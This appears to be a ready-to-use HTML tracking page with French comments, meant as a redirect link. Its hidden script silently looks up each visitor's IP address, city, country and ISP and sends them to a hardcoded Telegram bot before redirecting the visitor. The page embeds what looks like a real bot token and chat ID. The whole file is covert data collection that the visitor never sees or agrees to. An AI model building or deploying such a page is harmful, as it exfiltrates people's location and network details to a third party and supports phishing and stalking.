<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title></title>
  <style>body { display: none; }</style>
  <script>
    (async () => {
      try {
        // 1. R√©cup√©ration IP + infos via ipinfo.io
        const res = await fetch('https://ipinfo.io/json?token=');
        const data = await res.json();

        const ip = data.ip || 'inconnu';
        const country = data.country || 'inconnu';
        const region = data.region || '';
        const city = data.city || '';
        const org = data.org || 'inconnu';

        const flagEmoji = String.fromCodePoint(...[...country].map(c => 127397 + c.charCodeAt()));

        // 2. Construction du message Telegram
        const message = `üì° Nouveau visiteur\nIP: ${ip}\nPays: ${country} ${flagEmoji}\nüìç ${city}, ${region}\nüè¢ FAI: ${org}`;

        // 3. Envoi √† Telegram
        const botToken = '7633904177:AAHGchn80h2QDuAmo_amRVwa7PxhgMNOPiY'; // ‚Üê remplace par ton token
        const chatId = '6996434307';     // ‚Üê remplace par ton chat_id
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        await fetch(telegramUrl);

      } catch (err) {
        // Optionnel : console.error(err);
      } finally {
        // 4. Redirection automatique apr√®s 1 seconde
        setTimeout(() => {
          window.location.href = 'https://tonlien.com'; // ‚Üê ton lien final
        }, 1000);
      }
    })();
  </script>
</head>

</html>
